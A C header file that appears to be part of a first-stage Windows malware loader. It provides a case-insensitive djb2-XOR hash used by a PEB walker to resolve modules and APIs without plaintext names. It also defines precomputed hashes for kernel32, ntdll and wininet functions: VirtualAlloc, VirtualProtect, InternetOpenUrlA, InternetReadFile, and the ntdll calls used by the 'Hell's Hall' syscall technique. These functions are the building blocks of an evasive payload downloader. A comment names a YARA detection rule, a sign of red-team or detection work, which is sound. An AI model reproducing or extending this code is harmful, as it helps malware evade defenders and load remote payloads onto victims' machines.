/*
 * djb2 hash, XOR variant, case-insensitive.
 *
 * Used by the PEB walker to match loaded-module names and DLL exports
 * without embedding those names as plaintext strings.
 *
 * Algorithm:
 *   h = 5381
 *   for each byte c: h = ((h << 5) + h) ^ tolower(c)
 *
 * Detection artifact: djb2 shl-5 + add + xor pattern (YARA: stage1_peb_walk).
 */

#ifndef HASH_H
#define HASH_H

#include <stdint.h>
#include <stddef.h>

static inline uint8_t hash_lower(uint8_t c) {
    return (c >= 'A' && c <= 'Z') ? (uint8_t)(c + 32) : c;
}

static inline uint32_t djb2i_ascii(const char *s) {
    uint32_t h = 5381u;
    while (*s) {
        h = ((h << 5) + h) ^ hash_lower((uint8_t)*s);
        s++;
    }
    return h;
}

/*
 * Hash a UTF-16 buffer low-byte by low-byte. Module names in the PEB
 * Ldr list are UNICODE_STRING; ASCII-range characters only for our
 * targets (kernel32.dll, wininet.dll, etc).
 *
 * @param s           UTF-16 buffer
 * @param max_chars   Number of UTF-16 code units to hash (NOT bytes)
 */
static inline uint32_t djb2i_wide(const uint16_t *s, size_t max_chars) {
    uint32_t h = 5381u;
    for (size_t i = 0; i < max_chars; i++) {
        uint16_t c = s[i];
        if (c == 0) break;
        h = ((h << 5) + h) ^ hash_lower((uint8_t)(c & 0xff));
    }
    return h;
}

/* Precomputed hashes for modules and exports (case-insensitive djb2 XOR). */
#define H_KERNEL32_DLL       0x3e003875u
#define H_KERNELBASE_DLL     0x0a8817e1u
#define H_WININET_DLL        0x2da84aa9u
#define H_NTDLL_DLL          0xe91aad51u

#define H_VIRTUALALLOC       0xda3d3c49u
#define H_VIRTUALPROTECT     0xee7f054fu
#define H_VIRTUALFREE        0xd80ec430u
#define H_SLEEP              0x0bad27eau
#define H_GETTICKCOUNT       0x6dcb1f05u
#define H_LOADLIBRARYA       0x0020513du
#define H_EXITPROCESS        0xf81031ceu
#define H_INTERNETOPENA      0x8508c76bu
#define H_INTERNETOPENURLA   0x356c30a0u
#define H_INTERNETREADFILE   0x24b4cfaau
#define H_INTERNETCLOSEHANDLE 0xf7cf8d82u

/* ntdll exports used by Hell's Hall (S34). */
#define H_NT_ALLOC_VM        0x83ffec22u  /* NtAllocateVirtualMemory */
#define H_NT_PROTECT_VM      0x10a4db54u  /* NtProtectVirtualMemory  */

#endif /* HASH_H */
